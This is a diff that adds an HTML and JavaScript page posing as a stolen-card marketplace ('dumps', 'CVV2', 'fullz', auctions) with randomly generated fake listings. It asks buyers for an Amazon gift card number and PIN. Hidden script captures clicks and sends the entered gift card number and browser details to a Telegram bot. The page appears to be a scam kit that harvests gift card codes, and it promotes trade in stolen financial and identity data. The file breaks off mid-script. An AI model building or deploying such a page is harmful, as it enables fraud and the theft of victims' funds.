@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS // DATA MARKETPLACE</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent: #06b6d4; /* Cyan */
+            --accent-hover: #0891b2;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg-dark); 
+            color: var(--text-main);
+        }
+        
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+
+        /* Animations */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.3s ease-out forwards; }
+
+        /* Table Styling */
+        .data-table tr { transition: background 0.2s; }
+        .data-table tr:hover { background-color: rgba(6, 182, 212, 0.05); }
+        .data-table th { background-color: #1e293b; color: #94a3b8; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.05em; }
+        .data-table td { border-bottom: 1px solid #334155; font-size: 0.8rem; }
+        
+        /* Status Badges */
+        .badge-live { background: rgba(16, 185, 129, 0.1); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.2); }
+        .badge-died { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); }
+        .badge-refund { background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.2); }
+
+        /* Inputs */
+        input, select {
+            background-color: #0f172a;
+            border-color: #334155;
+            color: white;
+        }
+        input:focus, select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(6, 182, 212, 0.2);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col selection:bg-cyan-500 selection:text-white">
+
+    <!-- Top Navigation Bar -->
+    <nav class="bg-slate-900/80 backdrop-blur-md border-b border-slate-700 sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto flex whitespace-nowrap overflow-x-auto py-2 px-4 gap-2">
+            <button onclick="switchTab('dumps')" id="btn-dumps" class="nav-btn active px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-cyan-400 text-cyan-400 hover:text-cyan-300 transition-colors"><i class="fas fa-database mr-2"></i>DUMPS</button>
+            <button onclick="switchTab('cvv2')" id="btn-cvv2" class="nav-btn px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-transparent text-slate-400 hover:text-cyan-400 transition-colors"><i class="fas fa-credit-card mr-2"></i>CVV2</button>
+            <button onclick="switchTab('fullz')" id="btn-fullz" class="nav-btn px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-transparent text-slate-400 hover:text-cyan-400 transition-colors"><i class="fas fa-user-secret mr-2"></i>FULLZ</button>
+            <button onclick="switchTab('wholesale')" id="btn-wholesale" class="nav-btn px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-transparent text-slate-400 hover:text-cyan-400 transition-colors"><i class="fas fa-boxes mr-2"></i>BULK</button>
+            <button onclick="switchTab('cart')" id="btn-cart" class="nav-btn px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-transparent text-slate-400 hover:text-cyan-400 transition-colors flex items-center gap-2">
+                <i class="fas fa-shopping-cart"></i> CART <span id="cart-count" class="bg-red-600 text-white text-[10px] rounded-full px-1.5 py-0.5">0</span>
+            </button>
+            <button onclick="switchTab('auction')" id="btn-auction" class="nav-btn px-4 py-2 text-xs font-bold tracking-wider border-b-2 border-transparent text-red-400 hover:text-red-300 transition-colors"><i class="fas fa-gavel mr-2"></i>AUCTION</button>
+        </div>
+    </nav>
+
+    <!-- User Account Status Subheader -->
+    <div class="bg-slate-800/50 border-b border-slate-700 py-2 px-4">
+        <div class="max-w-7xl mx-auto flex flex-wrap justify-between items-center text-xs text-slate-400 gap-2">
+            <div class="flex items-center gap-4">
+                <div>User: <strong class="text-cyan-400">Guest_7734</strong></div>
+                <div>Rating: ⭐️ <span id="user-rating-display">0</span> (Crabs)</div>
+                <span class="text-slate-500">Server Time: <span id="clock" class="font-mono text-cyan-500">00:00:00</span> EST</span>
+            </div>
+            <div class="flex items-center space-x-3">
+                <span class="text-emerald-500 font-semibold flex items-center gap-1"><i class="fas fa-circle text-[8px] animate-pulse"></i> SECURE CONNECTION</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow max-w-7xl w-full mx-auto p-4 space-y-4">
+
+        <!-- TAB: DUMPS / MARKETPLACE VIEW -->
+        <div id="tab-content-dumps" class="space-y-4 block animate-fade-in">
+
+            <!-- Filter Panel Box -->
+            <div class="bg-slate-800 p-4 rounded-lg border border-slate-700 shadow-lg">
+                <div class="flex items-center justify-between mb-3 pb-2 border-b border-slate-700">
+                    <div class="flex items-center gap-2">
+                        <input type="checkbox" id="live-filter" class="mr-1.5 accent-cyan-400 bg-slate-900 border-slate-600" checked>
+                        <span class="text-xs text-slate-400 font-medium">Live Filtering Active</span>
+                    </div>
+                    <div class="text-xs text-slate-500 font-mono">Database: US-EAST-1 (Mirrored)</div>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 text-xs">
+                    <!-- Row 1 Filters -->
+                    <div class="lg:col-span-2 space-y-3">
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">BIN Search:</label>
+                            <input type="text" id="filter-bin" placeholder="e.g. 411111" class="w-full border border-slate-600 rounded p-1.5 focus:ring-2 focus:ring-cyan-500 outline-none" oninput="applyFilters()">
+                        </div>
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">Bank Name:</label>
+                            <select id="filter-bank" class="w-full border border-slate-600 rounded p-1.5 bg-slate-900 outline-none" onchange="applyFilters()">
+                                <option value="">- All Banks -</option>
+                                <option value="CHASE">Chase</option>
+                                <option value="BOFA">Bank of America</option>
+                                <option value="WELLS_FARGO">Wells Fargo</option>
+                                <option value="CITIBANK">Citibank</option>
+                                <option value="US_BANK">U.S. Bank</option>
+                                <option value="CAP_ONE">Capital One</option>
+                                <option value="DISCOVER">Discover</option>
+                                <option value="SILICON_VALLEY">SVB</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="lg:col-span-2 space-y-3">
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">Card Type:</label>
+                            <select id="filter-type" class="w-full border border-slate-600 rounded p-1.5 bg-slate-900 outline-none" onchange="applyFilters()">
+                                <option value="">- All Types -</option>
+                                <option value="VISA">VISA</option>
+                                <option value="Mastercard">Mastercard</option>
+                                <option value="AMEX">AMEX</option>
+                                <option value="DISCOVER">Discover</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">Status:</label>
+                            <select id="filter-status" class="w-full border border-slate-600 rounded p-1.5 bg-slate-900 outline-none" onchange="applyFilters()">
+                                <option value="">- All Statuses -</option>
+                                <option value="LIVE">Live / Valid</option>
+                                <option value="DIED">Died</option>
+                                <option value="REFUNDABLE">Refundable</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="lg:col-span-2 space-y-3">
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">Price Range ($):</label>
+                            <div class="flex gap-2">
+                                <input type="number" id="filter-price-min" placeholder="Min" class="w-1/2 border border-slate-600 rounded p-1.5 outline-none" oninput="applyFilters()">
+                                <input type="number" id="filter-price-max" placeholder="Max" class="w-1/2 border border-slate-600 rounded p-1.5 outline-none" oninput="applyFilters()">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block font-medium text-slate-400 mb-1">Data Quality:</label>
+                            <select id="filter-quality" class="w-full border border-slate-600 rounded p-1.5 bg-slate-900 outline-none" onchange="applyFilters()">
+                                <option value="">- Any -</option>
+                                <option value="FULLZ">Fullz (Name+Addr+SSN)</option>
+                                <option value="DUMP">Dump Only</option>
+                                <option value="CVV">CVV Only</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-4 flex justify-end gap-2 border-t border-slate-700 pt-3">
+                    <button onclick="resetFilters()" class="px-4 py-1.5 border border-slate-600 rounded bg-slate-800 hover:bg-slate-700 text-xs font-medium text-slate-300 transition">Clear Filters</button>
+                    <button onclick="applyFilters()" class="px-5 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-bold shadow shadow-cyan-900/20 transition"><i class="fas fa-search mr-1"></i> Scan Market</button>
+                </div>
+            </div>
+
+            <!-- Data Table Container -->
+            <div class="bg-slate-800 rounded-lg border border-slate-700 shadow-xl overflow-hidden">
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs border-collapse data-table">
+                        <thead class="bg-slate-900 text-slate-400 border-b border-slate-700 font-semibold uppercase tracking-wider text-[10px]">
+                            <tr>
+                                <th class="p-3 w-8"><input type="checkbox" id="select-all-checkbox" onclick="toggleSelectAll(this)" class="accent-cyan-400 bg-slate-900 border-slate-600"></th>
+                                <th class="p-3">BIN</th>
+                                <th class="p-3">Type</th>
+                                <th class="p-3">Bank</th>
+                                <th class="p-3">Level</th>
+                                <th class="p-3">Exp</th>
+                                <th class="p-3">Track</th>
+                                <th class="p-3">Zip</th>
+                                <th class="p-3">Address</th>
+                                <th class="p-3">Status</th>
+                                <th class="p-3">Price</th>
+                                <th class="p-3 text-center">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="marketplace-table-body" class="divide-y divide-slate-700/50">
+                            <!-- Populated dynamically via script -->
+                        </tbody>
+                    </table>
+                </div>
+                <div class="p-3 bg-slate-900 border-t border-slate-700 text-xs text-slate-500 flex flex-wrap justify-between items-center gap-2">
+                    <div>Showing <span id="record-count" class="text-cyan-400">0</span> records</div>
+                    <div class="flex items-center gap-2">
+                        <button onclick="buySelectedItems()" class="bg-cyan-700 hover:bg-cyan-600 text-white px-4 py-1.5 rounded font-bold transition shadow shadow-cyan-900/30 text-xs border border-cyan-600">🛒 Checkout Selected</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: CART VIEW -->
+        <div id="tab-content-cart" class="hidden space-y-4 animate-fade-in">
+            <div class="bg-slate-800 p-6 rounded-lg border border-slate-700 shadow-xl space-y-4">
+                <div class="flex justify-between items-center border-b border-slate-700 pb-3">
+                    <h2 class="font-bold text-white text-lg"><i class="fas fa-shopping-cart mr-2 text-cyan-400"></i>Shopping Cart</h2>
+                    <button onclick="clearCart()" class="text-xs text-red-400 hover:text-red-300 hover:underline font-medium">Empty Cart</button>
+                </div>
+                <div id="cart-items-container" class="space-y-2 text-xs min-h-[100px]">
+                    <p class="text-slate-500 text-center py-10 italic">Your cart is empty.</p>
+                </div>
+                <div id="cart-summary" class="border-t border-slate-700 pt-4 flex flex-col sm:flex-row justify-between items-center gap-4 hidden bg-slate-900/50 p-4 rounded">
+                    <div class="text-sm font-semibold">Total Cost: <span id="cart-total-price" class="text-emerald-400 font-bold text-lg ml-2">$0.00</span></div>
+                    <button onclick="openCheckoutTerminal()" class="bg-cyan-600 hover:bg-cyan-500 text-white px-6 py-2 rounded text-sm font-bold shadow shadow-cyan-900/40 transition transform hover:-translate-y-0.5 border border-cyan-500">Proceed to Terminal ➔</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: AUCTION -->
+        <div id="tab-content-auction" class="hidden space-y-4 animate-fade-in">
+            <div class="bg-gradient-to-r from-slate-800 to-slate-900 p-6 rounded-lg border border-red-900/50 shadow-xl">
+                <div class="flex justify-between items-center mb-6">
+                    <div>
+                        <h2 class="font-bold text-xl text-red-500"><i class="fas fa-gavel mr-2"></i>Live Auction Block</h2>
+                        <p class="text-xs text-red-400 mt-1">High-value Fullz lots ending soon</p>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xs text-slate-500 uppercase font-bold">Time Remaining</div>
+                        <div id="auction-timer" class="text-2xl font-mono font-bold text-red-500">04:59</div>
+                    </div>
+                </div>
+
+                <div id="auction-item-container" class="space-y-4">
+                    <!-- Populated by JS -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Generic Placeholder -->
+        <div id="tab-content-other" class="hidden bg-slate-800 p-12 rounded-lg border border-slate-700 shadow-sm text-center space-y-4">
+            <div class="text-4xl text-slate-600 mb-2"><i class="fas fa-tools"></i></div>
+            <h2 id="other-tab-title" class="text-xl font-bold text-white">Section Header</h2>
+            <p class="text-slate-400 max-w-xl mx-auto text-sm">This sector is currently syncing with the mainframe.</p>
+            <button onclick="switchTab('dumps')" class="bg-slate-700 text-white px-4 py-2 rounded text-xs font-medium hover:bg-slate-600 transition border border-slate-600">Return to Market</button>
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-slate-900 border-t border-slate-800 py-4 mt-8 text-center text-xs text-slate-500">
+        <p>&copy; 2026 NEXUS GATEWAY &bull; Secure Servers: Virginia | Texas</p>
+    </footer>
+
+    <!-- Item Details Modal -->
+    <div id="item-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-slate-800 rounded-lg max-w-md w-full p-6 space-y-4 shadow-2xl border border-slate-600 transform transition-all scale-100">
+            <div class="flex justify-between items-center border-b border-slate-700 pb-2">
+                <h3 class="font-bold text-white text-base"><i class="fas fa-microchip mr-2 text-cyan-400"></i>Record Analysis</h3>
+                <button onclick="closeItemModal()" class="text-slate-400 hover:text-white font-bold text-xl">&times;</button>
+            </div>
+            <div id="item-modal-content" class="text-xs space-y-3 text-slate-300 bg-slate-900 p-4 rounded border border-slate-700 font-mono">
+                <!-- Dynamic Content -->
+            </div>
+            <div class="flex justify-end pt-2 gap-2">
+                <button onclick="closeItemModal()" class="px-4 py-1.5 border border-slate-600 rounded text-xs font-medium hover:bg-slate-700 text-slate-300">Close</button>
+                <button id="modal-add-cart-btn" class="px-4 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-bold shadow transition">Add to Cart</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pay Terminal Modal Pop-up -->
+    <div id="checkout-modal" class="fixed inset-0 bg-black/90 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
+        <div class="bg-slate-800 rounded-xl max-w-lg w-full max-h-[90vh] overflow-y-auto shadow-2xl p-6 space-y-4 border-t-4 border-cyan-500">
+            <div class="flex justify-between items-start border-b border-slate-700 pb-3">
+                <div>
+                    <span class="bg-cyan-900/50 text-cyan-300 text-xs font-bold px-2 py-0.5 rounded border border-cyan-700">Secure Gateway</span>
+                    <h3 class="text-lg font-bold text-white mt-1">💳 Checkout Terminal</h3>
+                </div>
+                <button onclick="closeCheckoutTerminal()" class="text-slate-400 hover:text-white text-xl font-bold">&times;</button>
+            </div>
+
+            <div class="space-y-3 text-xs text-slate-300">
+                <div class="bg-slate-900 p-3 rounded border border-slate-700">
+                    <p class="font-semibold text-white mb-2">Order Summary:</p>
+                    <div id="checkout-items-list" class="space-y-1 max-h-32 overflow-y-auto pr-1">
+                        <!-- Populated dynamically -->
+                    </div>
+                    <div class="border-t border-slate-700 mt-2 pt-2 flex justify-between font-bold text-sm">
+                        <span>Total Due:</span>
+                        <span id="checkout-modal-total" class="text-emerald-400">$0.00</span>
+                    </div>
+                </div>
+
+                <!-- Payment Method -->
+                <div class="space-y-2">
+                    <label class="block font-medium text-slate-300">Payment Method:</label>
+                    <div class="flex items-center gap-3 p-2 bg-slate-700/50 border border-slate-600 rounded">
+                        <i class="fab fa-amazon text-2xl text-white"></i>
+                        <div>
+                            <span class="block font-bold text-white">Amazon Gift Card</span>
+                            <span class="text-[10px] text-slate-400">Enter card number below</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-2">
+                    <label class="block font-medium text-slate-300">Gift Card Number:</label>
+                    <input type="text" id="gc-number" placeholder="XXXX-XXXX-XXXX-XXXX" class="w-full border border-slate-600 rounded p-2 font-mono outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 bg-slate-900">
+                </div>
+
+                <div class="space-y-2">
+                    <label class="block font-medium text-slate-300">PIN (Back of card):</label>
+                    <input type="password" id="gc-pin" placeholder="••••" class="w-full border border-slate-600 rounded p-2 font-mono outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 bg-slate-900">
+                </div>
+
+                <div id="payment-status-area" class="hidden p-3 bg-slate-700 rounded border border-slate-600 text-center">
+                    <!-- Loading or Success/Error messages go here -->
+                </div>
+
+            </div>
+
+            <div class="pt-3 border-t border-slate-700 flex justify-end gap-2">
+                <button onclick="closeCheckoutTerminal()" class="px-4 py-2 border border-slate-600 rounded text-xs font-medium hover:bg-slate-700 text-slate-300 transition">Cancel</button>
+                <button id="authorize-payment-btn" onclick="processAmazonGC()" class="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 text-white rounded text-xs font-bold transition shadow shadow-cyan-900/40 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center border border-cyan-500">
+                    <span>Verify & Pay</span>
+                    <div id="pay-loader" class="loader hidden" style="width: 15px; height: 15px; border-width: 2px; border-top-color: white;"></div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div id="toast" class="fixed bottom-6 right-6 bg-slate-800 text-white text-xs px-5 py-3 rounded-lg shadow-xl transform translate-y-20 opacity-0 transition-all duration-300 z-50 flex items-center gap-3 pointer-events-none border border-slate-600">
+        <i id="toast-icon" class="fas fa-check-circle text-emerald-400"></i>
+        <span id="toast-msg">Action performed successfully</span>
+    </div>
+
+    <script>
+        // --- TELEGRAM CONFIGURATION ---
+        const TG_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace this
+        const TG_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace this
+        
+        // Function to send click data to Telegram
+        function sendToTelegram(action, data) {
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent.substring(0, 50);
+            const message = `🔔 *New Action Detected*\n\n⏱ Time: ${timestamp}\n👤 User: Guest_7734\n📍 Action: ${action}\n📦 Data: ${JSON.stringify(data)}\n🖥 UA: ${userAgent}`;
+            
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log("TG Send failed", err));
+        }
+
+        // Intercept all clicks on the document
+        document.addEventListener('click', (e) => {
+            const target = e.target;
+            let action = "Click";
+            let data = {};
+
+            if (target.closest('.row-select')) {
+                action = "Row Checkbox Toggled";
+                data = { rowId: target.closest('tr')?.querySelector('td:nth-child(2)')?.innerText };
+            } else if (target.closest('[onclick*="addToCart"]')) {
+                action = "Added to Cart";
+                data = { bin: target.closest('tr')?.querySelector('td:nth-child(2)')?.innerText };
+            } else if (target.closest('[onclick*="showItemAnalysis"]')) {
+                action = "Viewed Record Details";
+                data = { bin: target.closest('tr')?.querySelector('td:nth-child(2)')?.innerText };
+            } else if (target.closest('#authorize-payment-btn')) {
+                action = "Initiated Payment";
+                data = { gc: document.getElementById('gc-number').value };
+            }
+
+            if (Object.keys(data).length > 0) {
+                sendToTelegram(action, data);
+            }
+        });
+
+
+        // --- DATA GENERATION (REALISTIC US) ---
+        const usStreets = ["Maple", "Oak", "Cedar", "Pine", "Elm", "Washington", "Main", "Broadway", "Park", "Lake", "Hill", "River", "Sunset", "Mansion"];
+        const usTypes = ["St", "Ave", "Blvd", "Dr", "Ln", "Way", "Pl"];
+        const usCities = [
+            { city: "New York", state: "NY", zip: "10001", bank: "Chase" },
+            { city: "Los Angeles", state: "CA", zip: "90001", bank: "Bank of America" },
+            { city: "Chicago", state: "IL", zip: "60601", bank: "JPMorgan Chase" },
+            { city: "Houston", state: "TX", zip: "77001", bank: "Wells Fargo" },
+            { city: "Phoenix", state: "AZ", zip: "85001", bank: "US Bank" },
+            { city: "Philadelphia", state: "PA", zip: "19101", bank: "PNC Financial" },
+            { city: "San Antonio", state: "TX", zip: "78201", bank: "Frost Bank" },
+            { city: "San Diego", state: "CA", zip: "92101", bank: "City National" },
+            { city: "Dallas", state: "TX", zip: "75201", bank: "Wells Fargo" },
+            { city: "San Jose", state: "CA", zip: "95101", bank: "Silicon Valley Bank" },
+            { city: "Austin", state: "TX", zip: "73301", bank: "First Bank" },
+            { city: "Jacksonville", state: "FL", zip: "32099", bank: "TD Bank" },
+            { city: "Fort Worth", state: "TX", zip: "76101", bank: "Wells Fargo" },
+            { city: "Columbus", state: "OH", zip: "43085", bank: "KeyBank" },
+            { city: "Charlotte", state: "NC", zip: "28201", bank: "Wells Fargo" },
+            { city: "San Francisco", state: "CA", zip: "94102", bank: "Silicon Valley Bank" },
+            { city: "Indianapolis", state: "IN", zip: "46201", bank: "Fifth Third" },
+            { city: "Seattle", state: "WA", zip: "98101", bank: "Wells Fargo" },
+            { city: "Denver", state: "CO", zip: "80201", bank: "US Bank" },
+            { city: "Boston", state: "MA", zip: "02101", bank: "Bank of Boston" }
+        ];
+
+        const cardTypes = ["VISA", "Mastercard", "AMEX", "Discover"];
+        const levels = ["Standard", "Gold", "Platinum", "Signature"];
+
+        // Fixed Amazon Gift Card Denominations
+        const gcValues = [25, 50, 100, 300];
+
+        function generateMockData(count) {
+            const data = [];
+            for (let i = 0; i < count; i++) {
+                const cityInfo = usCities[Math.floor(Math.random() * usCities.length)];
+                const type = cardTypes[Math.floor(Math.random() * cardTypes.length)];
+                const level = levels[Math.floor(Math.random() * levels.length)];
+
+                let binBase = "";
+                if(type === "VISA") binBase = "4";
+                else if(type === "Mastercard") binBase = "5";
+                else if(type === "AMEX") binBase = "3";
+                else if(type === "Discover") binBase = "6";
+
+                const bin = binBase + Math.floor(1000 + Math.random() * 9000).toString();
+
+                // UPDATED EXPIRATION LOGIC: Forces dates into 2027 and 2028
+                const expMonth = String(Math.floor(1 + Math.random() * 12)).padStart(2, '0');
+                const futureYears = [27, 28, 29];
+                const expYear = String(futureYears[Math.floor(Math.random() * futureYears.length)]).padStart(2, '0');
+
+                // Pick a random Amazon GC value
+                const price = gcValues[Math.floor(Math.random() * gcValues.length)];
+
+                // Generate Realistic Address
+                const houseNum = Math.floor(10 + Math.random() * 9990);
+                const streetName = usStreets[Math.floor(Math.random() * usStreets.length)];
+                const streetType = usTypes[Math.floor(Math.random() * usTypes.length)];
+                const address = `${houseNum} ${streetName} ${streetType}`;
+
+                data.push({
+                    id: i + 1,
+                    bin: bin,
+                    type: type,
+                    bank: cityInfo.bank,
+                    level: level,
+                    exp: `${expMonth}/${expYear}`,
+                    track: Math.random() > 0.5 ? "T1+T2" : "T1",
+                    zip: cityInfo.zip,
+                    address: address,
+                    status: "REFUNDABLE", // Always Refundable
+                    price: price,
+                    country: "USA",
+                    city: cityInfo.city,
+                    state: cityInfo.state
+                });
+            }
+            return data;
+        }
+
+        const mockData = generateMockData(50);
+        let cart = [];
+        let currentOrderHistory = [];
+
+        // --- INITIALIZATION ---
+        window.onload = function() {
+            renderTable(mockData);
+            startClock();
+            initAuction();
+        };
+
+        // --- CORE FUNCTIONS ---
+
+        function startClock() {
+            setInterval(() => {
+                const now = new Date();
+                document.getElementById('clock').innerText = now.toLocaleTimeString('en-US', { timeZone: 'America/New_York', hour12: false });
+            }, 1000);
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('marketplace-table-body');
+            tbody.innerHTML = '';
+
+            if (data.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="12" class="p-8 text-center text-slate-500 bg-slate-900/50">No records match your criteria.</td></tr>`;
+                document.getElementById('record-count').innerText = 0;
+                return;
+            }
+
+            data.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-slate-700/30 cursor-pointer transition border-b border-slate-700/50 group";
+
+                let statusColor = "badge-refund"; // Refundable default
+                if(item.status === "DIED") statusColor = "badge-died";
+                if(item.status === "LIVE") statusColor = "badge-live";
+
+                tr.onclick = (e) => {
+                    if(e.target.tagName !== 'INPUT' && e.target.tagName !== 'BUTTON') {
+                        showItemAnalysis(item);
+                    }
+                };
+
+                tr.innerHTML = `
+                    <td class="p-3"><input type="checkbox" class="row-select accent-cyan-400 bg-slate-900 border-slate-600" value="${item.id}"></td>
+                    <td class="p-3 font-mono font-bold text-cyan-400 group-hover:text-cyan-300">${item.bin}</td>
+                    <td class="p-3 font-semibold text-slate-200">${item.type}</td>
+                    <td class="p-3 text-slate-400 truncate max-w-[100px]" title="${item.bank}">${item.bank}</td>
+                    <td class="p-3 text-xs text-slate-500">${item.level}</td>
+                    <td class="p-3 font-mono text-slate-400">${item.exp}</td>
+                    <td class="p-3 font-mono text-center text-xs text-slate-500">${item.track}</td>
+                    <td class="p-3 font-mono text-center text-xs text-slate-400">${item.zip}</td>
+                    <td class="p-3 text-slate-300 truncate max-w-[120px]" title="${item.address}, ${item.city}, ${item.state}">${item.address}</td>
+                    <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] font-bold uppercase ${statusColor}">${item.status}</span></td>
+                    <td class="p-3 font-bold text-white">$${item.price.toFixed(2)}</td>
+                    <td class="p-3 text-center">
+                        <button onclick="addToCart(event, ${item.id})" class="bg-slate-700 hover:bg-cyan-600 hover:text-white text-slate-400 p-2 rounded transition shadow-sm transform active:scale-95 border border-slate-600 hover:border-cyan-500" title="Add to Cart">
+                            <i class="fas fa-plus"></i>
+                        </button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+            document.getElementById('record-count').innerText = data.length;
+        }
+
+        function applyFilters() {
+            const binVal = document.getElementById('filter-bin').value.toLowerCase();
+            const bankVal = document.getElementById('filter-bank').value;
+            const typeVal = document.getElementById('filter-type').value;
+            const statusVal = document.getElementById('filter-status').value;
+            const priceMin = parseFloat(document.getElementById('filter-price-min').value) || 0;
+            const priceMax = parseFloat(document.getElementById('filter-price-max').value) || 99999;
+            const qualityVal = document.getElementById('filter-quality').value;
+
+            const filtered = mockData.filter(item => {
+                const matchBin = item.bin.toLowerCase().includes(binVal);
+                const matchBank = bankVal === "" || item.bank.includes(bankVal);
+                const matchType = typeVal === "" || item.type === typeVal;
+                const matchStatus = statusVal === "" || item.status === statusVal;
+                const matchPrice = item.price >= priceMin && item.price <= priceMax;
+
+                let matchQuality = true;
+                if(qualityVal === "FULLZ") matchQuality = item.level !== "Standard";
+                if(qualityVal === "DUMP") matchQuality = item.track === "T1";
+                if(qualityVal === "CVV") matchQuality = item.track === "T1+T2";
+
+                return matchBin && matchBank && matchType && matchStatus && matchPrice && matchQuality;
+            });
+
+            renderTable(filtered);
+        }
+
+        function resetFilters() {
+            document.getElementById('filter-bin').value = '';
+            document.getElementById('filter-bank').value = '';
+            document.getElementById('filter-type').value = '';
+            document.getElementById('filter-status').value = '';
+            document.getElementById('filter-price-min').value = '';
+            document.getElementById('filter-price-max').value = '';
+            document.getElementById('filter-quality').value = '';
+            document.getElementById('select-all-checkbox').checked = false;
+            renderTable(mockData);
+        }
+
+        // --- TAB LOGIC ---
+        function switchTab(tabName) {
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active', 'border-cyan-400', 'text-cyan-400');
+                btn.classList.add('border-transparent', 'text-slate-400', 'hover:text-cyan-400');
+            });
+
+            const activeBtn = document.getElementById(`btn-${tabName}`);
+            if(activeBtn) {
+                activeBtn.classList.add('active', 'border-cyan-400', 'text-cyan-400');
+                activeBtn.classList.remove('border-transparent', 'text-slate-400', 'hover:text-cyan-400');
+            }
+
+            document.getElementById('tab-content-dumps').classList.add('hidden');
+            document.getElementById('tab-content-cart').classList.add('hidden');
+            document.getElementById('tab-content-auction').classList.add('hidden');
+            document.getElementById('tab-content-other').classList.add('hidden');
+
+            if (['dumps', 'cvv2', 'fullz', 'wholesale'].includes(tabName)) {
+                document.getElementById('tab-content-dumps').classList.remove('hidden');
+            } else if (tabName === 'cart') {
+                document.getElementById('tab-content-cart').classList.remove('hidden');
+                renderCart();
+            } else if (tabName === 'auction') {
+                document.getElementById('tab-content-auction').classList.remove('hidden');
+            } else {
+                document.getElementById('tab-content-other').classList.remove('hidden');
+                document.getElementById('other-tab-title').innerText = tabName.toUpperCase() + " Section";
+            }
+        }
+
+        // --- CART LOGIC ---
+        function addToCart(e, id) {
+            e.stopPropagation();
+            const item = mockData.find(i => i.id === id);
+            if(item && !cart.some(i => i.id === id)) {
+                cart.push(item);
+                updateCartBadge();
+                showToast(`Added ${item.bin} to cart`, 'success');
+            } else {
+                showToast(`Item already in cart`, 'info');
+            }
+        }
+
+        function buySelectedItems() {
+            const checkboxes = document.querySelectorAll('.row-select:checked');
+            if (checkboxes.length === 0) {
+                showToast("Please select at least one item.", 'warning');
+                return;
+            }
+            checkboxes.forEach(cb => {
+                const id = parseInt(cb.value);
+                const item = mockData.find(i => i.id === id);
+                if (item && !cart.some(i => i.id === id)) {
+                    cart.push(item);
+                }
+            });
+            updateCartBadge();
+            switchTab('cart');
+        }
